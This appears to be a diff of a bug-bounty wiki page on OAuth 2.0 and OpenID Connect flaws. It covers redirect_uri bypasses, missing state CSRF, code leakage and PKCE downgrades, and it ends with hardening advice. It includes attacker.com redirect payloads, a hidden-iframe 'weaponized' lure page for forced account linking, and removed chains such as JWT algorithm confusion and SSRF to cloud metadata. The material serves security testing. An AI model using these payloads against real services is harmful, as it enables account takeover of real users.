@@ -1,7 +1,7 @@
 ---
-title: "OAuth 2.0 & OpenID Connect (OIDC) Attack Vectors & Account Takeover"
+title: "OAuth 2.0 & OpenID Connect (OIDC) Attack Vectors, Account Takeover & Protocol Vulnerabilities"
 created: 2026-09-25
-updated: 2026-09-25
+updated: 2026-10-01
 type: concept
 tags:
   - oauth
@@ -9,362 +9,155 @@ tags:
   - ato
   - bug-bounty
 sources:
-  - unprocessed-obsidians/oauth.md
+  - sources/oauth.md
+  - sources/authentication-vulnerabilities.md
 confidence: high
 contested: false
 contradictions: []
 parent: "[[web-and-bug-bounty]]"
 cluster: web-and-bug-bounty
 ---
-# OAuth 2.0 & OpenID Connect (OIDC) Attack Vectors & Account Takeover
+# OAuth 2.0 & OpenID Connect (OIDC) Attack Vectors, Account Takeover & Protocol Vulnerabilities
 
-## Overview
-OAuth 2.0 and OIDC implementations frequently suffer from redirection uri validation flaws, state parameter omission, authorization code leakage, and token handling discrepancies leading to complete Account Takeover (ATO).
+> **Classification**: OAuth 2.0 (RFC 6749) / OpenID Connect Core 1.0, CWE-287 (Improper Authentication), CWE-601 (Open Redirect in Authorization Callback).
+> **Primary Impact**: Pre-auth and post-auth Account Takeover (ATO), identity spoofing, authorization code theft, and unauthorized access to third-party resources.
 
-## Vulnerability Classes & Exploitation Chains
+---
 
-## Shortcut
+<!-- TOC_START -->
+## Table of Contents
+- [1. OAuth 2.0 & OIDC Protocol Foundations](#1-oauth-20--oidc-protocol-foundations)
+  - [Core Roles](#core-roles)
+  - [Key Authorization Parameters](#key-authorization-parameters)
+  - [OpenID Connect Standard Claims & Scopes](#openid-connect-standard-claims--scopes)
+- [2. Attack Vectors in Client Applications](#2-attack-vectors-in-client-applications)
+  - [Implicit Flow Authentication Parameter Tampering](#implicit-flow-authentication-parameter-tampering)
+  - [Forced OAuth Profile Linking (State Omission CSRF)](#forced-oauth-profile-linking-state-omission-csrf)
+  - [Authorization Code Leakage via Referer Headers](#authorization-code-leakage-via-referer-headers)
+- [3. Attack Vectors in OAuth Service Providers](#3-attack-vectors-in-oauth-service-providers)
+  - [Flawed redirect_uri Validation & Open Redirect Chains](#flawed-redirect_uri-validation--open-redirect-chains)
+  - [response_mode=form_post Injection (CVE-2023-6291 Bypass)](#response_modeform_post-injection-cve-2023-6291-bypass)
+  - [prompt=none Silent Consent & Code Stealing](#promptnone-silent-consent--code-stealing)
+  - [PKCE Downgrades & Code Interception](#pkce-downgrades--code-interception)
+- [4. Diagnostic Probes & Reconnaissance Workflows](#4-diagnostic-probes--reconnaissance-workflows)
+  - [OpenID Discovery Endpoints](#openid-discovery-endpoints)
+  - [Weaponized Profile Linking Exploit](#weaponized-profile-linking-exploit)
+- [5. Hardening Guidelines for Providers & Clients](#5-hardening-guidelines-for-providers--clients)
+- [6. Primary Sources & Provenance](#6-primary-sources--provenance)
+- [Related Pages](#related-pages)
+<!-- TOC_END -->
 
-- Check for improper redirect validation (open redirects)
-- Test state parameter manipulation/absence
-- Manipulate OAuth flows to bypass authentication
-- Try URL path traversal in redirect_uri
-- Hunt for client secret leakage in source code/repos
-- Look for improper scope validation
+## 1. OAuth 2.0 & OIDC Protocol Foundations
 
-## Mechanisms
+OAuth 2.0 is an authorization framework allowing applications to request limited access to user resources hosted on another service. OpenID Connect (OIDC) adds an identity verification layer on top of OAuth 2.0 by introducing standardized scopes and signed JSON Web Tokens (`id_token`).
 
-- **OAuth 2.0** authorizes limited access to resources via tokens; pair with **OIDC** for identity.
-- **Core Flows**:
-  - Authorization Code (with PKCE for public clients)
-  - Client Credentials (service-to-service)
-  - Avoid Implicit and ROPC where possible
-- **Key Components**:
-  - Resource Owner (user)
-  - Client (third-party app)
-  - Authorization Server (issues tokens)
-  - Resource Server (hosts protected resources)
-  - Tokens (access and refresh)
-- **Hardening Extensions**:
-  - PAR (Pushed Authorization Requests), JAR (Request Objects), JARM (JWT-secured responses)
-  - Sender‑constrained tokens (DPoP, mTLS)
-  - `private_key_jwt` or mTLS client authentication for confidential clients
+### Core Roles
+- **Resource Owner**: The user granting access.
+- **Client Application**: The application requesting access.
+- **Authorization Server**: Issues access tokens and authorization codes.
+- **Resource Server**: The API hosting protected user data.
 
-### OAuth/OIDC Considerations
+### Key Authorization Parameters
 
-- **PKCE everywhere**: Even with confidential clients/native apps; `code_verifier` must be required and validated.
-- **Nonce/state binding**: For OIDC, ensure `nonce` is present and matched; `state` should be unguessable and tied to session.
-- **`redirect_uri` exact match**: Enforce exact string match against pre-registered allowlist; no wildcards/path traversal.
-- **`aud`/`azp`/`iss` enforcement**: Validate tokens strictly, including clock skew and JWKS `kid` rotation behavior.
-- **Front-channel logout/login CSRF**: Validate logout CSRF; defend forced login to attacker accounts.
-- **ID Token vs Access Token**: APIs must not accept ID tokens; check `token_type` and audience.
-- **Device Code & CIBA**: Validate polling rate limits, code expiry, and binding of device/user codes.
-- **Refresh Token Rotation**: Enforce reuse detection and global invalidation chains.
-- **PAR/JAR/JARM**: Use to pin exact redirect_uri and inputs and to protect front-channel parameters.
+| Parameter | Purpose & Function | Common Security Pitfalls |
+| :--- | :--- | :--- |
+| `redirect_uri` | Endpoint where authorization codes/tokens are returned | Inexact regex matching, open redirect chaining, path traversal. |
+| `response_type` | Specifies flow (`code`, `token`, `id_token`) | Implicit grant tampering; downgraded security. |
+| `client_id` | Public client identifier | Leaked in public apps; client impersonation. |
+| `scope` | Extent of resource access requested | Over-permissioned tokens, privilege escalation. |
+| `state` | Unpredictable anti-CSRF token | Parameter omitted, static value, or unverified on callback. |
+| `prompt` | UI interaction control (`none`, `login`, `consent`) | `prompt=none` allows silent authentication without user consent. |
+| `response_mode` | Format of returned response (`query`, `fragment`, `form_post`) | Manipulated to inject form actions and bypass fragment parsing. |
 
-### OAuth 2.1 Updates
+### OpenID Connect Standard Claims & Scopes
 
-- **Implicit Flow Deprecated**: Authorization servers should not support `response_type=token`
-- **Password Grant Deprecated**: ROPC (Resource Owner Password Credentials) considered insecure
-- **PKCE Mandatory**: Required for all OAuth clients including confidential clients
-- **Exact Redirect URI Matching**: No more substring or prefix matching allowed
-- **Refresh Token Sender Constraint**: Refresh tokens should be sender-constrained via DPoP or mTLS
+- **Scopes**: `openid` (mandatory for OIDC), `profile`, `email`, `phone`, `offline_access` (requests refresh token).
+- **Standard Claims**: `sub` (permanent unique subject identifier), `name`, `family_name`, `given_name`, `picture`, `email`, `email_verified`.
 
-### Financial-grade API (FAPI) Security
+## 2. Attack Vectors in Client Applications
 
-#### FAPI 1.0 Advanced Profile
+### Implicit Flow Authentication Parameter Tampering
+In poorly designed applications implementing the implicit grant, the browser receives an access token and user identity parameters, which frontend JavaScript forwards to the backend:
+```http
+POST /authenticate HTTP/1.1
+Host: client-app.com
+Content-Type: application/json
 
-- **Signed Request Objects (JAR)**: Authorization requests as signed JWTs
-- **Hybrid Flow**: Uses `response_type=code id_token` for additional security
-- **MTLS Client Authentication**: Certificate-bound tokens
-- **JARM**: JWT-secured authorization response mode
-- **Request Object Encryption**: Sensitive parameters encrypted
+{"email": "victim@target.com", "token": "z0y9x8w7v6u5"}
+```
+If the backend accepts the `email` field without validating that the `token` was cryptographically issued to that specific email by the authorization server, an attacker modifies the email parameter to take over any user account!
 
-#### FAPI 2.0 Security Profile
+### Forced OAuth Profile Linking (State Omission CSRF)
+When client applications allow linking external social accounts (e.g. "Attach Google Account"):
+1. Attacker initiates OAuth linking and captures the callback:
+   ```http
+   GET /oauth-linking?code=ATTACKER_CODE HTTP/1.1
+   ```
+2. Drops the request so the code remains unconsumed.
+3. If the request lacks a cryptographically validated `state` parameter, the attacker forces the victim to visit this URL via an iframe:
+   ```html
+   <iframe src="https://target.com/oauth-linking?code=ATTACKER_CODE"></iframe>
+   ```
+4. The victim's account is linked to the attacker's social profile, enabling subsequent login.
 
-- **Pushed Authorization Requests (PAR)**: POST request parameters to dedicated endpoint
-- **DPoP (Demonstrating Proof-of-Possession)**: Token bound to client's key pair
-- **Client Authentication**: `private_key_jwt` or MTLS required
-- **Grant Management**: Rich authorization requests and grant management API
+### Authorization Code Leakage via Referer Headers
+If the client callback page loads external images, analytics scripts, or CSS:
+- The full callback URL containing the secret code (`https://client-app.com/callback?code=SECRET_CODE`) is transmitted in the HTTP `Referer` header to third-party endpoints.
 
-```mermaid
-graph TD
-    User[Resource Owner] -->|Initiates flow| Client
-    Client -->|Authorization Request| AuthServer[Authorization Server]
-    AuthServer -->|Authentication| User
-    User -->|Approves access| AuthServer
-    AuthServer -->|Authorization Code| Client
-    Client -->|Code + Client Secret| AuthServer
-    AuthServer -->|Access Token| Client
-    Client -->|Access Token| ResourceServer[Resource Server]
-    ResourceServer -->|Protected Resource| Client
+## 3. Attack Vectors in OAuth Service Providers
 
-    style User fill:#b7b,stroke:#333,color:#333
-    style Client fill:#aae,stroke:#333,color:#333
-    style AuthServer fill:#9f9,stroke:#333,color:#333
-    style ResourceServer fill:#e9a,stroke:#333,color:#333
+### Flawed redirect_uri Validation & Open Redirect Chains
+- **Regex Flaws**: If the authorization server accepts any redirect URI ending in `target.com`, attackers supply `https://attacker.com?target.com` or `https://target.com.attacker.com`.
+- **Open Redirect Chaining**: If `redirect_uri` validation is restricted to `target.com`, but `target.com/oauth/login/redirect?url=...` has an open redirect, the code is leaked via the redirect target:
+  ```text
+  redirect_uri=https://target.com/oauth/redirect?url=https://attacker.com
+  ```
+
+### response_mode=form_post Injection (CVE-2023-6291 Bypass)
+In Keycloak (CVE-2023-6291), an attacker changed `response_mode=fragment` to `response_mode=form_post`. This forced the authorization server to return an HTML form that submitted tokens via POST. Due to improper validation on the HTML form's action attribute, attackers directed the form submission to arbitrary attacker-controlled locations!
+
+### prompt=none Silent Consent & Code Stealing
+Setting `prompt=none` instructs the authorization server to fail if user interaction is needed. If the victim has already consented or has an active session, the authorization server skips the consent screen and immediately issues an authorization code to the redirect URI without any visual prompt to the victim.
+
+### PKCE Downgrades & Code Interception
+Proof Key for Code Exchange (PKCE) prevents authorization code interception on public clients. Attackers attempt to strip `code_challenge` and `code_challenge_method` to force the server into fallback legacy flows.
+
+## 4. Diagnostic Probes & Reconnaissance Workflows
+
+### OpenID Discovery Endpoints
+Retrieve configuration and supported grant types:
+```http
+GET /.well-known/openid-configuration HTTP/1.1
+Host: oauth-provider.com
+
+GET /.well-known/oauth-authorization-server HTTP/1.1
+Host: oauth-provider.com
 ```
 
-## Hunt
-
-- Intercept OAuth flows with proxy (Burp/ZAP)
-- Manipulate redirect_uri parameters
-- Remove/tamper state parameter
-- Test PKCE implementations
-- Inspect token handling in browsers
-- Check for client secret leakage
-- Analyze scope handling logic
-- Test account linking/unlinking
-- Review token validation procedures
-- Examine refresh token security
-
-#### Native/Mobile
-
-- Verify App Links/Universal Links to prevent hijacking callbacks.
-- Ensure OAuth proxy components in mobile apps validate issuer and JWKS; do not ship client secrets in binaries.
-
-#### SPA/Browser
-
-- Use Authorization Code + PKCE; avoid Implicit/Hybrid unless justified.
-- Store tokens in memory; if cookies are used, set `__Host-` prefix with `HttpOnly; Secure; SameSite`.
-
-### Authorization Code Flow
-
-- Initial authorization request has `response_type=code`
-- Request format: `/authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24`
-- Callback contains authorization code: `/callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24`
-- More secure, backend exchanges code for tokens
-
-```mermaid
-sequenceDiagram
-    participant User
-    participant Client
-    participant AuthServer as Authorization Server
-    participant API as Resource Server
-
-    User->>Client: 1. Click "Login with Service"
-    Client->>AuthServer: 2. Authorization Request (response_type=code)
-    AuthServer->>User: 3. Login & Consent
-    User->>AuthServer: 4. Approves Access
-    AuthServer->>Client: 5. Redirect with Authorization Code
-    Client->>AuthServer: 6. Token Request (code + client_secret)
-    AuthServer->>Client: 7. Access & Refresh Tokens
-    Client->>API: 8. API Request + Access Token
-    API->>Client: 9. Protected Resource
+### Weaponized Profile Linking Exploit
+```html
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Claim Your Account Credit</h1>
+  <iframe style="display:none;" src="https://target.com/auth/callback?code=STOLEN_AUTH_CODE"></iframe>
+</body>
+</html>
 ```
 
-### Implicit Flow
+## 5. Hardening Guidelines for Providers & Clients
 
-- Initial authorization request has `response_type=token`
-- Request format: `/authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24`
-- Access token returned directly in URL fragment: `/callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24`
-- Higher vulnerability potential due to frontend token handling
+1. **Strict Exact-Match redirect_uri**: Disallow wildcards, subpaths, and regex pattern matching. Enforce byte-for-byte URI matching.
+2. **Mandatory Cryptographic State Parameter**: Bind `state` values to the user's active session cookie using HMAC signatures to defeat CSRF.
+3. **Mandate PKCE for All Clients**: Enforce S256 code challenge verification on all authorization code exchanges.
+4. **Validate ID Tokens Server-Side**: Verify JWT signatures against trusted JWKS endpoints (`/.well-known/jwks.json`), validating `aud`, `iss`, and `exp` claims.
 
-```mermaid
-sequenceDiagram
-    participant User
-    participant Client as Client (Browser)
-    participant AuthServer as Authorization Server
-    participant API as Resource Server
+## 6. Primary Sources & Provenance
+- Provenance source anchors: [[sources/oauth|oauth]], [[sources/authentication-vulnerabilities|authentication-vulnerabilities]]
 
-    User->>Client: 1. Click "Login with Service"
-    Client->>AuthServer: 2. Authorization Request (response_type=token)
-    AuthServer->>User: 3. Login & Consent
-    User->>AuthServer: 4. Approves Access
-    AuthServer->>Client: 5. Redirect with Access Token in Fragment
-    Note over Client: Token stored in browser
-    Client->>API: 6. API Request + Access Token
-    API->>Client: 7. Protected Resource
-```
+Synthesized from canonical vault notes `unprocessed-obsidians/oauth.md` and `Notes/OLD Notes/WEB/vulnerabilities/Authentication vulnerabilities/`.
 
-## Vulnerabilities
-
-- **Improper redirect_uri validation**
-  - Open redirects
-  - Subdomain/path validation bypass
-- **CSRF attacks** (missing/improper state parameter)
-- **Token leakage** (URL fragments in referrer headers)
-- **Scope elevation** (improper authorization)
-- **Account takeover** via improper linking/unlinking
-- **JWT vulnerabilities** (weak signatures, lack of validation)
-- **Client secret exposure** in source/git repositories
-- **Authorization bypass** in misconfigured implementations
-- **Session fixation** attacks
-- **Access token theft** via XSS/Man-in-the-Middle
-
-#### Authorization Code Injection / Code Substitution
-
-- Attacker injects victim authorization code into attacker session to bind victim account. Mitigate with state-nonce binding and PKCE.
-
-#### Method 1: Auth Bypass in OAuth Implicit Flow
-
-- Locate POST request containing user info (email, username) and access token
-- In implicit flow, servers often don't properly validate access tokens
-- Try changing user parameters (email, username) while keeping the token
-- Potentially impersonate other users if server trusts client-provided identifiers
-
-#### Method 2: Forced Profile Linking
-
-- Target OAuth profile linking functionality
-- Check for missing `state` parameter in auth requests
-- Create CSRF attack by copying auth URL before code/token use
-- Deliver as direct link or embedded iframe to victim
-- Can link attacker's social media to victim's account
-
-#### Method 3: Account Hijacking via redirect_uri
-
-- Identify authorization request with redirect_uri parameter
-- Test redirect_uri manipulation (external domains or open redirects)
-- Modify redirect_uri to attacker-controlled endpoint (webhook)
-- Deliver modified auth URL to victim to capture their authorization code
-- Use stolen code to complete OAuth flow and access victim's account
-
-## Methodologies
-
-- **Tools**:
-  - Burp Suite (OAuth Scanner extension)
-  - OWASP ZAP
-  - OAuth 2.0 Threat Model Toolkit
-  - Postman for API testing
-  - JWT_Tool for token analysis
-  - OAuthSecurity Cheatsheet Scanner
-- **Techniques**:
-  - Flow manipulation
-  - Parameter tampering
-  - Token analysis
-  - Replay attacks
-  - Social engineering (phishing for tokens)
-  - DPoP proof validation testing
-  - MTLS certificate validation testing
-  - PAR endpoint exploitation
-  - Token exchange flow testing
-
-## Chaining and Escalation
-
-### OAuth → Full Account Takeover
-
-1. **Open Redirect → Authorization Code Theft**:
-   - Discover open redirect on trusted domain
-   - Craft OAuth flow with redirect_uri pointing to open redirect
-   - Victim clicks malicious link, completes OAuth flow
-   - Authorization code redirected through open redirect to attacker
-   - Attacker exchanges code for access token
-
-2. **CSRF → Account Linking Attack**:
-   - Initiate OAuth flow to link social account
-   - Capture authorization callback URL before code is used
-   - Deliver URL to victim via CSRF
-   - Victim's account linked to attacker's social account
-   - Attacker logs in with social account to access victim's account
-
-3. **XSS → Token Theft**:
-   - Find XSS vulnerability on application
-   - Inject script to steal access tokens from localStorage
-   - Use stolen tokens to access victim's API resources
-   - If refresh tokens stolen, maintain persistent access
-
-### OAuth → Lateral Movement
-
-1. **Token Exchange → Service Impersonation**:
-   - Obtain low-privilege access token
-   - Use RFC 8693 token exchange to request token for different service
-   - Weak validation allows unauthorized service access
-   - Move laterally across microservices
-
-2. **Scope Elevation → Privilege Escalation**:
-   - Obtain token with limited scope
-   - Manipulate refresh token exchange to request broader scopes
-   - Weak scope validation grants elevated permissions
-   - Access privileged API endpoints
-
-3. **IdP Confusion → Cross-Tenant Access**:
-   - Multi-tenant application with multiple IdPs
-   - Obtain authorization code from Tenant A's IdP
-   - Exchange code at Tenant B's token endpoint
-   - Weak issuer validation grants cross-tenant access
-
-### OAuth → Backend Exploitation
-
-1. **JWT Algorithm Confusion → Signature Bypass**:
-   - Obtain valid JWT access token
-   - Change algorithm from RS256 to HS256
-   - Sign token with public key (treating it as HMAC secret)
-   - Backend fails to validate algorithm properly
-   - Forge arbitrary tokens for privilege escalation
-
-2. **SSRF via redirect_uri → Internal Service Access**:
-   - OAuth provider allows internal redirect_uri
-   - Set redirect_uri to internal service (http://169.254.169.254)
-   - Authorization response sent to internal service
-   - Use to access cloud metadata or internal APIs
-
-3. **Token Replay → Session Hijacking**:
-   - Capture access token via network sniffing or logs
-   - Token not properly bound to client (no DPoP/MTLS)
-   - Replay token from attacker's system
-   - Hijack victim's session and access resources
-
-## Remediation Recommendations
-
-### OAuth 2.1 / Modern Implementation
-
-- **Implement OAuth 2.1**: Adopt latest security recommendations
-  - Deprecate Implicit and Password grants
-  - Require PKCE for all clients (public and confidential)
-  - Enforce exact redirect_uri matching
-  - Implement refresh token rotation with reuse detection
-
-- **Enforce state parameter**: Always required, cryptographically random, single-use
-- **Validate token claims strictly**:
-  - `aud` (audience): Must match resource server
-  - `iss` (issuer): Verify against known issuers
-  - `exp` (expiration): Enforce with clock skew tolerance (max 60s)
-  - `nbf` (not before): Validate if present
-
-- **Secure token storage**:
-  - Never use localStorage (XSS vulnerable)
-  - Use httpOnly cookies with `__Host-` prefix or memory-only storage
-  - Set proper cookie flags: `HttpOnly; Secure; SameSite=Strict`
-
-### Advanced Security Features
-
-- **Implement PAR (Pushed Authorization Requests)**: POST parameters to `/par` endpoint
-- **Use DPoP (Demonstrating Proof-of-Possession)**: Bind access tokens to client's public key
-- **Implement MTLS for confidential clients**: Certificate-bound access tokens
-- **Use JAR (JWT-secured Authorization Request)**: Sign authorization request parameters
-- **Consider JARM (JWT-secured Authorization Response)**: Signed authorization responses
-
-### Token Management
-
-- **Short-lived access tokens**: 5-15 minutes maximum
-- **Refresh token rotation**: Issue new refresh token on each use
-- **Refresh token reuse detection**: Revoke entire token family on reuse
-- **Token binding**: Use DPoP or MTLS to bind tokens to clients
-
-### Standards and Compliance
-
-- Follow **OAuth 2.1** (draft) guidance
-- Implement **FAPI** if dealing with financial data
-- Follow **RFC 6819** OAuth threat model
-- Adopt **RFC 8252** for native apps
-- Consider **RFC 8693** for secure token exchange
-- Implement **RFC 9449** for DPoP
-
-### Regular Security Practices
-
-- Rotate signing keys regularly (every 6-12 months)
-- Implement JWKS with short TTL (< 1 hour)
-- Pin trusted issuers in client configuration
-- Conduct regular OAuth security audits
-- Keep libraries and dependencies updated
-
-## Primary Sources & Provenance
-- Provenance source anchor: [[oauth]]
-
-Synthesized and normalized from canonical vault note `[[unprocessed-obsidians/oauth]]`.
-
-## Related Concepts & Entities
-- [[oauth-grant-types-and-flows]]
-- [[open-redirect-in-oauth-flows]]
-- [[authorization-code-vs-implicit-flow]]
-- [[open-redirect-attacks]]
+## Related Pages
+- Parent Hub: [[web-and-bug-bounty]]
+- Target Concepts: [[oauth-grant-types-and-flows]], [[account-takeover-and-auth-flaws]], [[broken-authentication-and-credential-attacks]]
+- Comparisons: [[authorization-code-vs-implicit-flow]], [[open-redirect-in-oauth-flows]], [[jwt-in-oauth2-architecture]]
